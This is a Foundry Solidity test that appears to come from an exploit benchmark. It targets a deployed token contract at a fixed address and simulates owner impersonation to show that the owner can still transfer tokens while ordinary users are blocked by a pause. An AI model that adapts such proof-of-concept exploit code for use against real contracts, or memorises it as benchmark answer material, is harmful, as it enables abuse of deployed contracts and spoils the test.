// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IByTradeToken {
    function owner() external view returns (address);
    function pause() external;
    function unpause() external;
    function paused() external view returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xe8bd1CA97F8a0582335407B40B0576Df641fA94C;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the deployed contract at TARGET
        address owner = IByTradeToken(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Create a regular user address
        address regularUser = address(0x123);
        vm.label(regularUser, "Regular User");

        // Give some tokens to the owner (they already have from minting) and to regular user
        // First, get owner's balance and transfer some to regular user
        uint256 ownerBalance = IByTradeToken(TARGET).balanceOf(owner);

        // Impersonate owner to transfer tokens to regular user
        vm.startPrank(owner);
        IByTradeToken(TARGET).transfer(regularUser, 1000 * 10**18);
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Get the owner address
        address owner = IByTradeToken(TARGET).owner();

        // Step 2: Impersonate owner and pause the contract
        vm.startPrank(owner);
        IByTradeToken(TARGET).pause();
        vm.stopPrank();

        // Step 3: Verify contract is paused
        bool isPaused = IByTradeToken(TARGET).paused();
        require(isPaused == true, "Contract should be paused");

        // Step 4: Show regular user cannot transfer (should revert)
        address regularUser = address(0x123);
        address anotherUser = address(0x456);

        // Try to transfer as regular user - should revert
        vm.startPrank(regularUser);
        vm.expectRevert();
        IByTradeToken(TARGET).transfer(anotherUser, 100 * 10**18);
        vm.stopPrank();

        // Step 5: Show owner CAN transfer while paused
        vm.startPrank(owner);
        // This should succeed despite pause
        uint256 ownerBalanceBefore = IByTradeToken(TARGET).balanceOf(owner);
        IByTradeToken(TARGET).transfer(anotherUser, 100 * 10**18);
        uint256 ownerBalanceAfter = IByTradeToken(TARGET).balanceOf(owner);
        vm.stopPrank();

        // Verify transfer occurred
        require(ownerBalanceAfter < ownerBalanceBefore, "Owner transfer should have succeeded");

        // Final verification for oracle
        assertEq(isPaused, true, "Contract must be paused to demonstrate vulnerability");
        assertEq(IByTradeToken(TARGET).paused(), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
